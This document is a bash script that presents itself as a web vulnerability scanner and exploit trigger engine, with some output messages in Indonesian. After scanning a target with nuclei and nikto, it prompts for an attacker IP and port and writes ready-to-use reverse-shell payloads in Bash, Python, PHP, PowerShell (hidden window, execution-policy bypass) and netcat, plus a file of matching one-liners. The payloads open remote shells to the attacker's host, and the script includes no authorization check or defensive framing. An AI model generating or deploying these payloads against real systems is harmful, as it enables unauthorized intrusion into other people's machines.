#!/bin/bash

TARGET="$1"
OUTPUT_DIR="${2:-web_vuln_$(echo "$TARGET" | tr '/' '_' | tr ':' '_')}"
mkdir -p "$OUTPUT_DIR"
LOG_FILE="$OUTPUT_DIR/web_vuln.log"

exec > >(tee -a "$LOG_FILE") 2>&1

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'; NC='\033[0m'

# Strip protocol for clean target name
CLEAN_TARGET=$(echo "$TARGET" | sed 's|^https\?://||' | sed 's|/.*$||')
FULL_URL="$TARGET"
[[ "$FULL_URL" != http* ]] && FULL_URL="http://$FULL_URL"

echo -e "${CYAN}"
echo "  ╔══════════════════════════════════════════╗"
echo "  ║   WEB VULNERABILITY SCANNER             ║"
echo "  ║   & EXPLOIT TRIGGER ENGINE              ║"
echo "  ╚══════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}[*] Target:${NC} $FULL_URL"
echo -e "${YELLOW}[*] Output:${NC} $OUTPUT_DIR/"
echo ""

# ──────────────────────────────────────────────
# PHASE 1: HEADER & TECH STACK CHECK
# ──────────────────────────────────────────────
echo -e "${BLUE}════════════════════════════════════════════${NC}"
echo -e "${BLUE}  PHASE 1: Header & Tech Stack Detection   ${NC}"
echo -e "${BLUE}════════════════════════════════════════════${NC}"

TECH_FILE="$OUTPUT_DIR/tech_stack.txt"
HEADER_FILE="$OUTPUT_DIR/http_headers.txt"

echo -e "${YELLOW}[*] Fetching HTTP headers...${NC}"
curl -sI -L --max-time 10 "$FULL_URL" > "$HEADER_FILE" 2>/dev/null
echo "  HTTP Headers:" > "$TECH_FILE"
cat "$HEADER_FILE" | while IFS= read -r line; do
    echo "    $line" >> "$TECH_FILE"
done

echo "" >> "$TECH_FILE"
echo "  Tech Analysis:" >> "$TECH_FILE"

if command -v whatweb >/dev/null 2>&1; then
    echo -e "${YELLOW}[*] Running whatweb...${NC}"
    whatweb "$FULL_URL" --quiet 2>/dev/null | tee -a "$TECH_FILE"
else
    echo -e "${YELLOW}[*] whatweb not found, using curl-based detection...${NC}"
    # Manual tech detection from headers
    if grep -qi "x-powered-by:" "$HEADER_FILE" 2>/dev/null; then
        echo "  [Header] PHP detected" >> "$TECH_FILE"
    fi
    if grep -qi "asp.net" "$HEADER_FILE" 2>/dev/null; then
        echo "  [Header] ASP.NET detected" >> "$TECH_FILE"
    fi
    if grep -qi "nginx" "$HEADER_FILE" 2>/dev/null; then
        echo "  [Header] nginx detected" >> "$TECH_FILE"
    fi
    if grep -qi "apache" "$HEADER_FILE" 2>/dev/null; then
        echo "  [Header] Apache detected" >> "$TECH_FILE"
    fi
fi

echo ""
echo -e "${GREEN}[+] Tech stack saved to $TECH_FILE${NC}"
echo ""

# ──────────────────────────────────────────────
# PHASE 2: COMMON VULNERABILITY SCAN
# ──────────────────────────────────────────────
echo -e "${BLUE}════════════════════════════════════════════${NC}"
echo -e "${BLUE}  PHASE 2: Vulnerability Scanning          ${NC}"
echo -e "${BLUE}════════════════════════════════════════════${NC}"

VULN_FILE="$OUTPUT_DIR/vulnerabilities.txt"
echo "Vulnerability Scan Results - $FULL_URL" > "$VULN_FILE"
echo "Date: $(date)" >> "$VULN_FILE"
echo "========================================" >> "$VULN_FILE"
echo "" >> "$VULN_FILE"

# nuclei (recommended, fast YAML-based)
if command -v nuclei >/dev/null 2>&1; then
    echo -e "${YELLOW}[*] Running nuclei (fast template-based scanner)...${NC}"
    nuclei -u "$FULL_URL" -severity low,medium,high,critical \
        -o "$OUTPUT_DIR/nuclei_results.txt" -silent 2>/dev/null
    if [ -f "$OUTPUT_DIR/nuclei_results.txt" ] && [ -s "$OUTPUT_DIR/nuclei_results.txt" ]; then
        echo "=== NUCLEI RESULTS ===" >> "$VULN_FILE"
        cat "$OUTPUT_DIR/nuclei_results.txt" >> "$VULN_FILE"
        echo "" >> "$VULN_FILE"
        echo -e "${GREEN}[+] Nuclei menemukan kerentanan!${NC}"
    else
        echo "=== NUCLEI: No critical findings ===" >> "$VULN_FILE"
        echo -e "${YELLOW}[*] Nuclei selesai (tidak ada temuan kritis)${NC}"
    fi
else
    echo -e "${YELLOW}[*] nuclei tidak ditemukan. Install: sudo apt install nuclei${NC}"
    echo "=== NUCLEI: not installed ===" >> "$VULN_FILE"
fi

# nikto (background)
if command -v nikto >/dev/null 2>&1; then
    echo -e "${YELLOW}[*] Running nikto in background...${NC}"
    nikto -h "$FULL_URL" -o "$OUTPUT_DIR/nikto_results.txt" -Format txt 2>/dev/null &
    NIKTO_PID=$!
else
    echo -e "${YELLOW}[*] nikto tidak ditemukan.${NC}"
fi

wait $NIKTO_PID 2>/dev/null
if [ -f "$OUTPUT_DIR/nikto_results.txt" ] && [ -s "$OUTPUT_DIR/nikto_results.txt" ]; then
    echo "" >> "$VULN_FILE"
    echo "=== NIKTO RESULTS ===" >> "$VULN_FILE"
    head -50 "$OUTPUT_DIR/nikto_results.txt" >> "$VULN_FILE"
    echo -e "${GREEN}[+] Nikto selesai${NC}"
fi

echo ""
echo -e "${GREEN}[+] Vulnerability report saved to $VULN_FILE${NC}"
echo ""

# ──────────────────────────────────────────────
# PHASE 3: REVERSE SHELL GENERATOR
# ──────────────────────────────────────────────
echo -e "${BLUE}════════════════════════════════════════════${NC}"
echo -e "${BLUE}  PHASE 3: Reverse Shell Payload Generator  ${NC}"
echo -e "${BLUE}════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}  Masukkan IP/LHOST kamu untuk reverse shell:${NC}"
read -p "  LHOST > " LHOST
echo -e "${YELLOW}  Masukkan port (LHOST):${NC}"
read -p "  LPORT > " LPORT

if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo -e "${RED}  [!] LHOST/LPORT tidak boleh kosong, lewati...${NC}"
else
    PAYLOAD_DIR="$OUTPUT_DIR/payloads"
    mkdir -p "$PAYLOAD_DIR"

    echo ""
    echo -e "${GREEN}  Generating payloads for $LHOST:$LPORT...${NC}"
    echo ""

    # Bash reverse shell
    cat > "$PAYLOAD_DIR/bash.sh" << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF
    echo -e "  ${GREEN}[+]${NC} Bash:        $PAYLOAD_DIR/bash.sh"
    echo "      Usage: bash bash.sh"

    # Python reverse shell
    cat > "$PAYLOAD_DIR/python.py" << EOF
#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$LHOST",$LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
    echo -e "  ${GREEN}[+]${NC} Python:      $PAYLOAD_DIR/python.py"
    echo "      Usage: python3 python.py"

    # PHP reverse shell
    cat > "$PAYLOAD_DIR/php.php" << EOF
<?php
system("bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'");
EOF
    echo -e "  ${GREEN}[+]${NC} PHP:         $PAYLOAD_DIR/php.php"
    echo "      Usage: php php.php"

    # PowerShell reverse shell
    cat > "$PAYLOAD_DIR/ps.ps1" << EOF
\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);
\$stream = \$client.GetStream();
[byte[]]\$bytes = 0..65535|%{0};
while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
    \$sendback = (iex \$data 2>&1 | Out-String );
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
    \$stream.Flush()
};
\$client.Close()
EOF
    echo -e "  ${GREEN}[+]${NC} PowerShell:  $PAYLOAD_DIR/ps.ps1"
    echo "      Usage: On target: powershell -ExecutionPolicy Bypass -File ps.ps1"

    # Netcat reverse shell
    cat > "$PAYLOAD_DIR/nc.txt" << EOF
# Netcat (target must have nc -e or mkfifo)
nc -e /bin/sh $LHOST $LPORT

# Or with mkfifo (more reliable):
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
EOF
    echo -e "  ${GREEN}[+]${NC} Netcat:      $PAYLOAD_DIR/nc.txt"

    # One-liner summary
    cat > "$PAYLOAD_DIR/one_liners.txt" << EOF
=== REVERSE SHELL ONE-LINERS ===
Target: $FULL_URL
LHOST: $LHOST
LPORT: $LPORT

Bash:
  bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'

Python:
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

PHP:
  php -r '\$s=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

PowerShell:
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "\$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$se=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$se,0,\$se.Length);\$s.Flush()};\$c.Close()"

Netcat (mkfifo):
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
EOF
    echo -e "  ${GREEN}[+]${NC} One-liners:  $PAYLOAD_DIR/one_liners.txt"
    echo ""
fi

echo ""
echo -e "${GREEN}════════════════════════════════════════════${NC}"
echo -e "${GREEN}  WEB VULNERABILITY SCAN COMPLETE         ${NC}"
echo -e "${GREEN}════════════════════════════════════════════${NC}"
echo ""
echo -e "${WHITE}  OUTPUT FILES:${NC}"
echo "  ├─ $TECH_FILE          (tech stack + headers)"
echo "  ├─ $HEADER_FILE      (raw HTTP headers)"
echo "  ├─ $VULN_FILE (vulnerability report)"
echo "  └─ $PAYLOAD_DIR/         (reverse shell payloads)"
echo ""
echo -e "${CYAN}[>] All results saved to: $OUTPUT_DIR/${NC}"
